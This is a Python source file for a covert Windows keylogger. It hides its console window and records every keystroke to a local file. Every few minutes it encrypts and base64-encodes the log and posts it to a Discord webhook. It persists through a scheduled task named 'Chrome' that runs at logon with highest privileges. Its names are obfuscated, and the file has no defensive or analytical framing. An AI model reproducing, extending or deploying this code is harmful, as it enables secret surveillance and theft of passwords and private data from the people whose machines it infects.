import os
import time
import requests
import shutil
import sys
import subprocess
import base64
from cryptography.fernet import Fernet
import win32api
import win32console
import win32gui
import threading
import random

encryption_key = Fernet.generate_key()  
cipher = Fernet(encryption_key)

discord = 'asdasdasdasadasootherpeoplecantgetmydiscrodwebhook'
aaaaa = "s.txt"
path = os.path.abspath(__file__)

win32console.GetConsoleWindow()
win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)

KEY = {
    0x08: '[BACKSPACE]',
    0x09: '[TAB]',
    0x0D: '[ENTER]',
    0x10: '[SHIFT]',
    0x11: '[CTRL]',
    0x12: '[ALT]',
    0x20: '[SPACE]',
    0x25: '[LEFT]',
    0x26: '[UP]',
    0x27: '[RIGHT]',
    0x28: '[DOWN]',
}

def yyttyy(content):
    data = {
        "content": content
    }
    requests.post(discord, json=data)

def trtr():
    for i in range(0, 256):
        if win32api.GetAsyncKeyState(i) & 0x0001:
            if i in KEY:
                return KEY[i]
            else:
                return chr(i) if 32 <= i <= 126 else f"[{i}]"
    return None

def aassddsss():
    while True:
        key = trtr()
        if key:
            with open(aaaaa, "a") as log:
                log.write(key)
        time.sleep(0.01)

def kiki():
    while True:
        time.sleep(random.uniform(240, 600))
        if os.path.exists(aaaaa):
            with open(aaaaa, 'r') as f:
                gfgfgf = f.read()

            encrypted_content = cipher.encrypt(gfgfgf.encode())
            base64_encoded = base64.b64encode(encrypted_content).decode()

            yyttyy(base64_encoded)

            with open(aaaaa, "w") as lol:
                lol.write("")

def weqweqw():
    task_name = "Chrome"
    command = f'schtasks /create /tn "{task_name}" /tr "{path}" /sc onlogon /rl highest'
    
    subprocess.run(command, shell=True)

threading.Thread(target=aassddsss).start()
threading.Thread(target=kiki).start()

weqweqw()
